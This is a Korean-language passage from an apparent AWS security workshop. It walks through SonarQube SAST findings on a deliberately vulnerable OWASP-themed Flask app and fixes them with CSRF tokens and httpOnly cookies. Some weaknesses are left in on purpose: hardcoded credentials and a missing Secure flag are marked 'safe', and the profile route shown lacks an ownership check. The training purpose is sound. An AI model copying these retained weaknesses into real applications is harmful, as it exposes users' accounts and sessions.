![sast-step-success](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sast-step-success.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

9.  성공적인 SAST 실행 후 SonarQube 대시보드로 돌아가 결과를 탐색할 수 있습니다. SonarQube 대시보드의 메뉴 모음에서 **Projects**를 클릭합니다. 이제 **flask-app**이라는 새 프로젝트가 표시됩니다.

![sast-project](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sast-project.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

10.  **flask-app** 프로젝트를 클릭하고 **7** 보안 핫스팟이 있는지 확인합니다. 기본적으로 SonarQube는 보안 결과가 있더라도 스캔에 실패하지 않았음을 알 수 있습니다. 자신의 [Quality Gates](https://docs.sonarqube.org/latest/user-guide/quality-gates/) 를 정의하여 조직에 대한 규칙을 변경할 수 있습니다. 조직에서 SonarQube를 사용하려는 경우 이를 정의하는 것이 좋지만 이 실습에서는 건너뛰겠습니다. 자세한 내용을 보려면 **7 Security Hotspots**을 클릭하세요.

![sast-findings](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sast-findings.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

11.  모든 보안 결과에 대한 세부 정보가 표시되어야 합니다. 이제 SAST 결과를 얻었으므로 다음 섹션으로 넘어가 각 결과를 살펴보고 진행하면서 수정해 보겠습니다.

![sast-security-hotspots](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sast-security-hotspots.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)


# 코드 개요

본격적으로 시작하기 전에 웹 애플리케이션의 코드베이스가 어떻게 구성되었는지 간략히 살펴보도록 하겠습니다:

```md
   - flask-app
     - app.py   
     - models.py
     - utils.py  
     - pages/    
         - a1.py
         - a2.py
         - a3.py
         - a5.py
         - a6.py
         - a7.py
         - a9.py
     - templates/
         - a1.html
         - a2.html
         - a3.html
         - a5.html
         - a6.html
         - a7.html
         - a9.html
     - static/     
```

-   **app.py** - 웹 애플리케이션은 **[Flask Framework](https://flask.palletsprojects.com/en/2.0.x/) **를 사용해 구현되었습니다. **app.py**는 웹 애플리케이션의 시작지점이며 모든 페이지를 프로비저닝하고 데이터베이스를 부트스트랩하는데 사용됩니다.
-   **models.py** - **[Object Relational Mapper](https://en.wikipedia.org/wiki/Object%E2%80%93relational_mapping)**  라이브러리인 **[SQLALchemy](https://www.sqlalchemy.org/) **로 정의된 데이터베이스 모델을 포함합니다. 또한 개체 쿼리를 위한 몇 가지 도우미 함수가 포함되어 있습니다. 이 워크샵의 단순성을 위해 웹 애플리케이션은 [SQLite](https://www.sqlite.org/index.html) 를 데이터베이스로 사용합니다.
-   **utils.py** - 페이지가 공유하는 도우미 함수 집합입니다. 여기에서 세션 쿠키가 생성됩니다.
-   **pages/*.py** - 페이지 폴더에는 웹 애플리케이션의 각 페이지에 대한 구현이 포함되어 있습니다. 나중에 쉽게 디버깅하고 탐색할 수 있도록 OWASP Top Ten 취약점을 보여주는 각 페이지는 자체 python 파일에 보관됩니다(예: **A1: Injection**은 **pages/a1.py**에 작성됨 등).
-   **templates/*.html** - 웹 페이지를 렌더링하는 데 사용되는 **[Jinja2](https://jinja.palletsprojects.com/en/3.0.x/) **로 작성된 HTML 템플릿이 포함되어 있습니다. 페이지에서와 마찬가지로 각 템플릿은 자체 HTML 파일에 있는 OWASP Top Ten 취약점의 이름을 따서 명명되었습니다(예: **A1: Injection**은 **templates/a1.html** 등에 작성됨).
-   **static** - 웹 응용 프로그램에서 사용 중인 정적 콘텐츠를 포함합니다.

AWS Cloud9에서 각 파일을 열어 확인할 수 있습니다. 다음 섹션에서는 이 코드베이스를 스캔하는 데 사용할 첫 번째 자동 보안 도구를 소개합니다.

# True Positives 표시

SonarQube 우리를 위해 찾아낸 것을 먼저 살펴보도록 하겠습니다. **Authentication** 부터 시작하도록 하겠습니다.

![sonarqube-auth-hotspot](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-auth-hotspot.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

SAST 도구가 이 예와 같은 **True Positives**를 찾는 것은 지극히 정상입니다. SonarQube는 **badguy** 및 **john**에 대해 하드코딩된 자격 증명을 식별했습니다. 이것은 교육 웹 사이트이므로 이러한 자격 증명을 미리 만드는 것은 **의도적인 작업**입니다. 이것은 **의도된 작업**이므로 **Status** 버튼을 클릭하여 **Safe**으로 표시할 수 있습니다. (다른 결과에 대해서도 이 작업을 수행합니다.)

![sonarqube-auth-hotspot-resolv](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-auth-hotspot-resolv.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

# CSRF 보호 활성화

SonarQube 의 두번째 고위험 탐지 로그[Cross-Site Request Forgery](https://owasp.org/www-community/attacks/csrf) 

![sonarqube-csrf-hotspot](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-csrf-hotspot.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

이를 통해 공격자는 다른 인증된 사용자가 클릭할 수 있는 요청(예를 들어, 자금 이체)을 위조하여 원치 않는 작업을 실수로 실행할 수 있습니다. 이러한 종류의 공격을 방지하는 한 가지 방법은 **[Synchronizer Token Pattern](https://en.wikipedia.org/wiki/Cross-site_request_forgery#Synchronizer_token_pattern)**  또는 **CSRF 토큰**이라고 하는 것을 사용하는 것입니다. CSRF 토큰은 HTML 양식에 포함되어 입력의 유효성을 서명하는 데 사용되는 백엔드에서 생성된 고유한 값입니다.

SonarQube 역시 이를 예방할 수 있는 몇가지 권고사항을 제공합니다. 스크롤을 조금 내려보시면 Flask 에서 CSRF 를 구현하기 위한 예제가 있습니다. :

![sonarqube-csrf-flask](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-csrf-flask.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

이것은 우리의 첫 번째 코드 보안 수정 사항이 될 것입니다. AWS Cloud9으로 이동하여 코드를 편집해 보겠습니다.:

1.  우리는 수정을 위해 Flask의 [CSRF 솔루션](https://flask-wtf.readthedocs.io/en/latest/csrf/) 을 사용할 것입니다. **flask-app** 폴더 아래에서 **app.py** 파일을 편집하고 다음 코드 줄을 추가해 보겠습니다.:

```python
import os
from flask import Flask

from pages import (
    index,
    about,
    a1,
    a2,
    a3,
    a5,
    a6,
    a7,
    a9
)

import models
from flask_wtf.csrf import CSRFProtect

### Initialize App
app = Flask(__name__)
app.url_map.strict_slashes = False

### Enable CSRF
app.config['SECRET_KEY'] = os.urandom(32)
csrf = CSRFProtect()
csrf.init_app(app)


### Register blueprints
app.register_blueprint(index.bp)
app.register_blueprint(about.bp, url_prefix="/about")
app.register_blueprint(a1.bp, url_prefix="/owasp")
app.register_blueprint(a2.bp, url_prefix="/owasp")
app.register_blueprint(a3.bp, url_prefix="/owasp")
app.register_blueprint(a5.bp, url_prefix="/owasp")
app.register_blueprint(a6.bp, url_prefix="/owasp")
app.register_blueprint(a7.bp, url_prefix="/owasp")
app.register_blueprint(a9.bp, url_prefix="/owasp")

### Configure database
app.config['SQLALCHEMY_DATABASE_URI'] = "sqlite:///user.db"
models.db.init_app(app)
models.db.app = app
models.bootstrap(app)
```

2.  **app.py**를 저장합니다. 방금 추가한 강조 표시된 코드 줄은 Flask의 CSRF 보호 라이브러리를 가져와 애플리케이션에 연결합니다. **[CSRFProtect](https://flask-wtf.readthedocs.io/en/0.15.x/csrf/)**  토큰을 생성하고 안전하게 서명하려면 **SECRET_KEY**가 필요합니다. 단순화를 위해 웹 응용 프로그램의 인스턴스가 하나만 있으므로 임의 값을 사용합니다. 확장 설정의 경우 이 **SECRET_KEY**를 각 웹 애플리케이션 인스턴스 간에 공유하고 안전한 방식으로 저장해야 합니다(예: [AWS Secrets Manager](https://aws.amazon.com/secrets-manager/) .
    
3.  CSRF 보호를 추가하는 것만으로는 충분하지 않습니다. 보호하려는 HTML 양식에 CSRF 토큰을 포함하도록 HTML 템플릿을 업데이트해야 합니다. **templates/a2.html** 및 **templates/a5.html**에서 이 작업을 수행해야 합니다. 이러한 페이지는 사용자가 로그인할 때마다 브라우저 쿠키를 설정하기 때문입니다. **templates/a2.html**을 편집하고 코드를 아래의 내용으로 바꿉니다:
    

```html
<!DOCTYPE html>
<html>
    {% include "head.html" %}
    <body>
        <main>
            {% include "navbar.html" %}
            <div class="container col-xl-10 col-xxl-8 px-4 py-5">
                <div class="row align-items-center g-lg-5 py-5">
                  <div class="col-lg-7 text-center text-lg-start">
                    <h1 class="display-4 fw-bold lh-1 mb-3">A2: Broken Authentication</h1>
                    <p>Application functions related to authentication and session management are often implemented incorrectly, allowing attackers to compromise passwords, keys, or session tokens, or to exploit other implementation flaws to assume other users’ identities temporarily or permanently.</p>
                </div>
                  <div class="col-md-10 mx-auto col-lg-5">
                    <form class="p-4 p-md-5 border rounded-3 bg-light" action="/owasp/A2/auth" method="POST">
                      <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
                      <div class="form-floating mb-3">
                        <input type="text" class="form-control" id="floatingInput" name="username">
                        <label for="floatingInput">Username</label>
                      </div>
                      <div class="form-floating mb-3">
                        <input type="password" class="form-control" id="floatingPassword" name="password">
                        <label for="floatingPassword">Password</label>
                      </div>
                      <div class="checkbox mb-3">
                      </div>
                      <button class="w-100 btn btn-lg btn-primary" type="submit">Login</button>
                      <hr class="my-4">
                    </form>
                  </div>
                </div>
              </div>
        </main>
    </body>
</html>
```

4.  **templates/a5.html**에 대해서도 동일한 작업을 수행해 보겠습니다.

```html
<!DOCTYPE html>
<html>
    {% include "head.html" %}
    <body>
        <main>
            {% include "navbar.html" %}
            <div class="container col-xl-10 col-xxl-8 px-4 py-5">
                <div class="row align-items-center g-lg-5 py-5">
                  <div class="col-lg-7 text-center text-lg-start">
                    <h1 class="display-4 fw-bold lh-1 mb-3">A5: Broken Access Control</h1>
                    <p>Restrictions on what authenticated users are allowed to do are often not properly enforced. Attackers can exploit these flaws to access unauthorized functionality and/or data, such as access other users’ accounts, view sensitive files, modify other users’ data, change access rights, etc.</p>
                </div>
                  <div class="col-md-10 mx-auto col-lg-5">
                    <form class="p-4 p-md-5 border rounded-3 bg-light" action="/owasp/A5/auth" method="POST">
                      <input type="hidden" name="csrf_token" value="{{ csrf_token() }}"/>
                      <div class="form-floating mb-3">
                        <input type="text" class="form-control" id="floatingInput" name="username">
                        <label for="floatingInput">Username</label>
                      </div>
                      <div class="form-floating mb-3">
                        <input type="password" class="form-control" id="floatingPassword" name="password">
                        <label for="floatingPassword">Password</label>
                      </div>
                      <div class="checkbox mb-3">
                      </div>
                      <button class="w-100 btn btn-lg btn-primary" type="submit">Login</button>
                      <hr class="my-4">
                    </form>
                  </div>
                </div>
              </div>
        </main>
    </body>
</html>
```

5.  저장 후 다음 단계인 보안 수정을 진행하도록 하겠습니다.

# 쿠키 보호

우리가 수정할 다음 보안 문제는 보호되지 않은 쿠키로 인한 잠재적인 XSS 취약점입니다. [모듈 3에 대한 XSS 실습](https://catalog.us-east-1.prod.workshops.aws/event/dashboard/ko-KR/workshop/module3/a7_cross_site_scripting.html)을 기억한다면 공격자는 브라우저가 다른 웹페이지로 리다이렉션하도록 강제하는 클라이언트 측 자바스크립트 코드를 삽입하여 사용자의 **sessionId**를 훔쳤습니다.

![sonarqube-xss-hotspot](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-xss-hotspot.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

이를 방지하는 한 가지 방법은 **[httpOnly](https://owasp.org/www-community/HttpOnly)**  로 설정한 쿠키를 선택적으로 표시하는 것입니다. 이것은 여러분의 웹사이트가 설정한 쿠키가 다른 도메인에서 액세스할 수 없음을 브라우저에 지시합니다. 이것은 비교적 쉬운 수정입니다. AWS Cloud9으로 이동하도록 하겠습니다.

1.  SonarQube가 식별한 **두 개**의 파일이 있습니다. 먼저 **pages/a2.py** 를 편집하고 아래에 제공된 코드로 교체해 보겠습니다. 우리가 도입한 변경 사항은 쿠키가 설정되었을 때 **httponly**를 활성화한 **35**행에 있습니다.

```python
from flask import (
    Blueprint,
    request,
    redirect,
    render_template,
    make_response
)
from models import get_user_by_password
from utils import (
    generate_session,
    parse_session
)

bp = Blueprint(
    "a2", __name__,
    template_folder='templates',
    static_folder='static'
)

@bp.route("/A2")
def a2():
    return render_template("a2.html")

@bp.route("/A2/auth", methods=['POST'])
def a2_auth():
    username = request.form.get("username")
    password = request.form.get("password")
    user = get_user_by_password(username, password)
    if not user:
        return render_template("error.html", message="Invalid Crendentials")

    # Generate SessionID
    session_id = generate_session(username)
    response = make_response(redirect("/owasp/A2/welcome"))
    response.set_cookie("sessionId", session_id, httponly=True)

    return response

@bp.route("/A2/welcome")
def a2_welcome():
    if not request.cookies.get("sessionId"):
        return ("<h1>Not Authorized!</h1>")
    session_obj = parse_session(request.cookies.get("sessionId"))
    
    return render_template("welcome.html", username=session_obj['username'])
```

2.  **pages/a5.py** 에서도 동일한 작업을 수행해 보겠습니다.

```python
from flask import (
    Blueprint,
    request,
    redirect,
    make_response,
    render_template
)

from models import (
    get_user,
    get_user_by_password
)

from utils import (
    generate_session,
    parse_session
)

bp = Blueprint(
    "a5", __name__,
    template_folder='templates',
    static_folder='static'
)

@bp.route("/A5")
def a5():
    return render_template("a5.html")

@bp.route("/A5/auth", methods=['POST'])
def a5_auth():
    username = request.form.get("username")
    password = request.form.get("password")
    user = get_user_by_password(username, password)
    if not user:
        return render_template("error.html", message="Invalid Credentials")
    
    # Generate SessionID
    session_id = generate_session(username)
    response = make_response(redirect("/owasp/A5/profile/{}".format(username)))
    response.set_cookie("sessionId", session_id, httponly=True)
    
    return response

@bp.route("/A5/profile/<username>")
def a5_profile(username):
    if not request.cookies.get("sessionId"):
        return ("<h1>Not Authorized!</h1>")
    session = parse_session(request.cookies.get("sessionId"))
    user = get_user(username)
    if not user:
        return render_template("404.html")
    return render_template("profile.html", user=user)
```

3.  **Insecure Configuration** 아래에 쿠키와 관련된 또 다른 결과가 있습니다. 이는 **[Secure Flag](https://owasp.org/www-community/controls/SecureCookieAttribute) 도 켜야 함을 시사합니다.** 쿠키에 있습니다. **이것은 매우 권장됩니다**. 이렇게 하면 브라우저가 암호화되지 않은 HTTP 요청을 통해 쿠키를 보내는 것을 방지할 수 있습니다. 안타깝게도 실습 환경에서는 자체 도메인을 구매/사용할 수 없으므로 여기에서 AWS ACM을 사용할 수 없습니다. 당분간 이러한 결과를 **안전함**으로 표시할 것입니다(적어도 이 워크샵에서만큼은).

![sonarqube-insecure-config](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sonarqube-insecure-config.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

4.  저장 후 다음 단계인 보안 수정을 진행하도록 하겠습니다.

```bash
cd ~/environment/flask-app
git commit -a -m "Fix SAST Findings"
```

# 부록: sast_buildspec.yaml 탐색

**SonarQube**에 대해 코드베이스를 확인하도록 CodeBuild에 지시한 방법이 궁금하십니까?

**flask-app** 폴더 아래 **sast_buildspec.yaml**이라는 파일을 확인하면 이를 가능하게 만든 CodeBuild buildspec이 표시됩니다.

![sast-buildspec](https://static.us-east-1.prod.workshops.aws/c59761ac-466d-4102-893e-31a4156ac76d/static/images/sast-buildspec.png?Key-Pair-Id=K36Q2WVO3JP7QD&Policy=eyJTdGF0ZW1lbnQiOlt7IlJlc291cmNlIjoiaHR0cHM6Ly9zdGF0aWMudXMtZWFzdC0xLnByb2Qud29ya3Nob3BzLmF3cy9jNTk3NjFhYy00NjZkLTQxMDItODkzZS0zMWE0MTU2YWM3NmQvKiIsIkNvbmRpdGlvbiI6eyJEYXRlTGVzc1RoYW4iOnsiQVdTOkVwb2NoVGltZSI6MTY4MjQ4NDM0MH19fV19&Signature=hQd8PudF0O02SgJwp9j3OLuJRGqbiBdASiRToJWFJRLtcqZndWVX6tPliAWSDMtlbWzXvMzppzNATLZTD5j%7EfKbB%7Eqv6M4K8-0wwhbuaxQlsO77kETVf9SIUX-XVeYFnAqoVfF-NmGeR%7EbaDOOQUt6lCHnvie5KhleI2bJP33wc-1qVmR4sWEQN1i1T3oAEfMXDzondL6CNDcD5kpFqGI30djqNreXrMcBJTj4TCb2s1ZgKAJXaZ4vk8AzBQI2KZQQ5IWxHRsU2x9POlLy%7EdU4e2mK2q%7EQLjfh3gew%7E7%7EJu8cdoUdsWl7Qo29pOz4wo6yvYZGgI0UnRFeyTQzsimpQ__)

SAST CodeBuild 프로젝트는 이 파일을 찾고 필요한 명령을 실행합니다.:

```yaml
version: 0.1

phases:
  pre_build:
    commands:
      - echo Installing SAST Tool...
      - wget https://binaries.sonarsource.com/Distribution/sonar-scanner-cli/sonar-scanner-cli-4.6.2.2472-linux.zip
      - unzip sonar-scanner-cli-4.6.2.2472-linux.zip
      - mv sonar-scanner-4.6.2.2472-linux /opt/sonar-scanner
      - chmod -R 775 /opt/sonar-scanner
  build:
    commands:
      - echo Build started on `date`
      - /opt/sonar-scanner/bin/sonar-scanner -Dsonar.sources=. -Dproject.settings=sonar-project.properties -Dsonar.host.url=$SONARQUBE_URL -Dsonar.login=$SONARQUBE_ACCESS_TOKEN > sonarqube_scanreport.json
      - echo Build complete on `date`
```

**[Buildspecs](https://docs.aws.amazon.com/codebuild/latest/userguide/build-spec-ref.html)**  은 CodeBuild가 빌드를 실행하는 데 사용하는 빌드 명령 및 관련 설정의 모음입니다. 각 섹션을 살펴보겠습니다.

-   **pre_build** 명령은 기본적으로 빌드 준비를 실행하는 곳입니다. 이 경우에는 CodeBuild에 **[sonar-scanner-cli]([https://github.com/SonarSource/sonar-scanner-](https://github.com/SonarSource/sonar-scanner-)  cli)**. 이를 통해 CodeBuild에서 코드 분석을 실행할 수 있습니다.
-   **build** 명령은 **sonar-scanner-cli**를 사용하여 스캔 실행을 정의합니다. 필요한 구성(예: 검사할 소스의 위치, 제외된 파일 등)이 포함된 **sonar-project.properties**라는 다른 파일을 찾습니다.

